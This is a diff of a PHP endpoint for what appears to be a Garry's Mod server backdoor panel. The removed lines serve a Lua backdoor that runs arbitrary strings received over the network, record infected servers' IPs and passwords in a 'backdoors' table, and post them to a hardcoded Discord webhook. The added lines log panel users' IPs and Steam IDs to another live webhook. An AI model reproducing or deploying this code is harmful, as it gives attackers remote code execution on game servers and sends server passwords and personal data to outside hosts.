@@ -2,70 +2,60 @@
 
 require_once($_SERVER['DOCUMENT_ROOT']."/project/api/core/config.php");
 
+// prevent errors effecting script
+error_reporting(0);
+ini_set('display_errors', 0);
+
 // request date
-date_default_timezone_set('PST');
-$date = date("Y:m:d H:i:s");
+$date = date("y:m:d h:i:s");
 
-// game/server info
-$server = $_POST['server'];
+// website info
+$ip = $_SERVER[REMOTE_ADDR];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+
+// game info
+$steam = $_POST['steam'];
+$steamid = $_POST['steamid'];
+$steamid64 = $_POST['steamid64'];
 $serverip = $_POST['serverip'];
-$gamemode = $_POST['gamemode'];
-$password = $_POST['password'];
-$token = $_GET['token'];
-$map = $_POST['map'];
+$server = $_POST['server'];
 
-// if the servers password is null make it null
-if(empty($password)) { $password = "NULL"; }
+if($Script::Login($user, $pass)) { 
+    echo("authed"); // let the user know there authed
 
-$net = $Secure::Randomize(); // this generates a random string then we use that as the net because gamer!!!
-$lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";
+    // get the account info for later
+    $AccountInfo = $Account::Info($user);
 
-// if you noitced that the server request is gone then yk
-// in the .htaccess requests outside gmod or forbidden
+    // we need to assign this, brcause we don't post this
+    // but this infos nice to have in the log ;0
+    $uid = $AccountInfo['uid'];
+    $role = $AccountInfo['role'];
 
-echo $lua; // echo the backdoor script
-
-if($token) {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => $token]);
-    
-    // if the servers not found then create the log else if the servers found then update the log
-    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
-    else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
+    $GLOBALS['database']->Insert('logs', ["uid" => $uid, "role" => $role, "username" => $user, "ip" => $ip, "steam" => $steam, "steamid" => $steamid, "steamid64" => $steamid64, "server" => $server, "serverip" => $serverip, "date" => $date]);
 }
 
-else {
-    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => 'NONE']);
-    
-    // if the servers not found then create the log else if the servers found then update the log
-    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
-    else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
-    
-    $json_data = json_encode([
-        "embeds" => [
-            [
-                "title" => "",
-                "color" => hexdec("#86ffba"),
-                "timestamp" => date("c", strtotime("now")),
-                "description" => "```Server: $server\nServer IP: $serverip\nMap: $map\nPassword: $password\nGamemode: $gamemode\n```",
-                "footer" => [
-                    "text" => "Worst-Logging",
-                ]
+$json_data = json_encode([
+    "embeds" => [
+        [
+            "title" => "",
+            "color" => hexdec("#86ffba"),
+            "timestamp" => date("c", strtotime("now")),
+            "description" => "```Username: $user\nIP Address: $ip\nSteam Name: $steam\nSteam Id: $steamid\nSteam Id64: $steamid64\nServer: $server\nServer IP: $serverip\n```",
+            "footer" => [
+                "text" => "Worst-Logging",
             ]
         ]
-    ]);
+    ]
+]);
 
-    // send the public info to our discord through a embed using the json data defined above
-    $curl=curl_init("https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL");
-    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-    curl_setopt($curl, CURLOPT_POST, 1);
-    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($curl, CURLOPT_HEADER, 0);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
-    curl_exec($curl);
-
-    // finnally save the netstring so users can use later
-    file_put_contents($_SERVER['DOCUMENT_ROOT']."/project/bin/nets", "$net ", FILE_APPEND | LOCK_EX); 
-}
+$curl=curl_init("https://discord.com/api/webhooks/811023303861993513/sLpyMSf7o7VTuXhGAwPKK52EUIk9DQ02vD8nsoHBAYnaSOJG8T6LiZgcJUym8x-kUuM5");
+curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt($curl, CURLOPT_POST, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
+curl_exec($curl);
 
 ?>
